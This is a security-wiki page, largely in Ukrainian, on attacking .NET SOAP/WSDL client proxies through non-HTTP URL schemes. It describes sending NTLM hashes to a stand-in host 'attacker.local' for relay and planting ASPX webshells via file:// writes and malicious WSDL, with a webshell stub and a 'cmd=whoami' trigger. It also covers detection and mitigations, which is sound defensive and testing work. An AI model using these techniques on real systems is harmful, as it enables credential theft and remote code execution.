# .NET SOAP/WSDL Client Proxy Abuse

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` and friends inherit from `HttpWebClientProtocol`, whose `GetWebRequest()` returns the scheme-agnostic `WebRequest` instance produced by `WebRequest.Create()` without enforcing `HttpWebRequest`.
- If an attacker controls the proxy `Url`, the framework silently swaps in `FileWebRequest`, `FtpWebRequest` or UNC/SMB handlers, turning "HTTP" proxies into NTLM leak gadgets or arbitrary file writers.
- Any feature that imports attacker-supplied WSDL with `ServiceDescriptionImporter` compounds the bug: the WSDL controls the generated proxy constructor, SOAP methods, complex types and namespaces, enabling pre-auth RCE (webshells, script drops) in products such as Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell and SSIS.

## Root cause: HttpWebClientProtocol is scheme-agnostic

`WebClientProtocol.GetWebRequest()` does `var req = WebRequest.Create(uri)` and returns it untouched. `HttpWebClientProtocol.GetWebRequest()` tries `req as HttpWebRequest` to set HTTP-only fields, but it **still returns the original `req`** even when the cast fails. Therefore the runtime obeys whatever scheme is present in `Url`:

- `http(s)://` → `HttpWebRequest`
- `file:///` or `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

`SoapHttpClientProtocol.Invoke()` then streams the SOAP POST body through whatever transport handler was selected, even if that means writing to disk or over SMB.

## Primitive 1 – NTLM capture / relay via UNC targets

1. Отримати контроль над `SoapHttpClientProtocol.Url` (безпосереднє присвоєння, значення конфігу, рядок у базі даних тощо).
2. Вказати його на UNC шлях типу `file://attacker.local/sink/payload`.
3. CLR відкриває шлях через SMB і виконує інтегровану автентифікацію, витікає NTLM challenge/response до атакуючого.
4. Використати захоплені хеші для offline cracking або NTLM relay (SMB/HTTP) якщо signing/EPA відключені.

Це застосовується до **будь-якого** .NET SOAP/HTTP proxy шляху, що приймає ввід від користувача, навіть якщо подальша ескалація неможлива.

## Primitive 2 – Arbitrary file writes via `file://`

1. Встановити `Url = "file:///inetpub/wwwroot/poc.aspx"` (або будь-який записуваний шлях) перед викликом проксі.
2. Викликати будь-який SOAP метод; framework запише весь SOAP envelope у вказаний шлях, перезаписуючи існуючі файли.
3. Аргументи, контрольовані користувачем, з'являються всередині XML елементів, що дозволяє завантажувати CSHTML/ASPX payload-и або отруювати конфігураційні файли.

Обмеження:

- Контент завжди XML; скалярні поля entity-encoded, тому інжекція `<script>` через прості рядки потребує додаткових прийомів.
- Для значущих payload-ів потрібен принаймні один аргумент під контролем атакуючого або можливість змінити сигнатуру методу (див. WSDL abuse).

Runtime часто кидає помилку `Client found response content type of 'application/octet-stream', but expected 'text/xml'` після запису — трактуйте цю помилку як IOC.

## Weaponizing WSDL imports

### Auto-generated proxies via `ServiceDescriptionImporter`

Багато продуктів надають функцію "custom web service", яка приймає URL WSDL, далі:

1. `ServiceDescription.Read()` читає WSDL, контрольований атакуючим.
2. `ServiceDescriptionImporter` генерує C# proxy класи, що наслідують `SoapHttpClientProtocol`.
3. CodeDOM компілює проксі, а reflection викликає потрібний метод.

Атакуючий повністю контролює:

- `soap:address` / `soap12:address` `location` → стає `base.Url` (можна вказати `file://` або UNC шляхи).
- Імена методів, списки параметрів, комплексні типи та серіалізатори.
- Namespace URI, які потрапляють як `xmlns:*` атрибути в кожне SOAP повідомлення.

Перевірки схеми не відбуваються, тому кожен згенерований проксі успадковує початкову вразливість.

### Shaping the SOAP envelope for RCE

- Complex type serialization: Визначте власні структури у WSDL так, щоб коли `XmlSerializer` повторно серіалізує їх, вони генерували елементні імена/атрибути, вибрані атакуючим. Для завантаження ASPX webshell-ів — створіть типи, які серіалізуються у:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
і вкажіть `Url` на `file:///.../webroot/shell.aspx`, щоб отримати RCE.
- Namespace injection: Навіть коли аргументи жорстко прописані (наприклад, Umbraco Forms), namespace-и, оголошені у WSDL (наприклад, `xmlns:tns="http://host/service?x=@{...}"`), копіюються дослівно в SOAP envelope. Кодування payload-ів всередині query string namespace дозволяє скидати CSHTML Razor або PowerShell скрипти без контролю над параметрами.

Ці техніки були використані в експлоїті Barracuda Service Center RMM (CVE-2025-34392): анонімний SOAP виклик надіслав шкідливий WSDL, встановив `soap12:address` на `file:///Program Files/.../SCMessaging/poc.aspx`, вколов `<script runat="server">` через комплексні параметри і завантажив webshell, який виконував довільні `cmd.exe` команди.

## Typical attack workflow

1. Виявити функціональність, що приймає URL WSDL або дозволяє користувачам конфігурувати SOAP endpoints (наприклад, Barracuda `InvokeRemoteMethod`, Ivanti EPM connectors, Umbraco 8 Forms datasources, PowerShell `New-WebServiceProxy`).
2. Розмістити шкідливий WSDL, чий `soap:address` вказує на записуваний шлях або UNC share і чия схема визначає методи/типи зручні для payload-ів.
3. Спровокувати імпорт/компіляцію. Ціль згенерує proxy DLL з конструктором і методами під контролем атакуючого.
4. Коли застосунок викликає згенерований метод, SOAP запит серіалізується і записується у шлях, вказаний атакуючим, вбудовуючи payload.
5. Виконати скинутий файл (відкрити `poc.aspx?cmd=whoami`, завантажити CSHTML, або дозволити PowerShell виконати скрипт) або повторно використати захоплені NTLM дані.

## Detection & hunting

- Static analysis: Знайти `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol`, або `New-WebServiceProxy`. Відстежити, звідки беруться `Url` або WSDL входи — будь-який контроль користувача є тривожним сигналом.
- Runtime telemetry:
- Інструментувати створення проксі для логування схем; піднімати тривогу при `file`, `ftp` або UNC значеннях.
- Моніторити характерні помилки `Client found response content type of 'application/octet-stream', but expected 'text/xml'` після SOAP викликів.
- Слідкувати за несподіваними `.aspx/.cshtml/.ps1` записами в директоріях застосунку, виконаними від імені ідентичності веб-сервера.
- Network/file сигнали: SMB підключення, ініційовані веб-серверами до інфраструктури атакуючого, або раптова компіляція тимчасових proxy DLL часто передують експлуатації.

## Mitigations

- Enforce transport validation before invoking any `HttpWebClientProtocol`-derived proxy:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- Sanitize imported WSDL: Proxy downloads through a broker that rewrites or rejects `soap:address` entries that are not HTTP/S, drops unknown bindings, and forbids namespace payload tricks.
- Disable untrusted WSDL features: Replace "upload a WSDL" conveniences with vetted, server-side templates or allowlists.
- Segregate write locations: Ensure app pools cannot write into executable directories; use separate volumes for data vs. code so that file-write primitives do not become RCE.
- Harden NTLM exposure: Disable outbound SMB where possible; otherwise enforce SMB signing, EPA and other relay mitigations.

## References

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
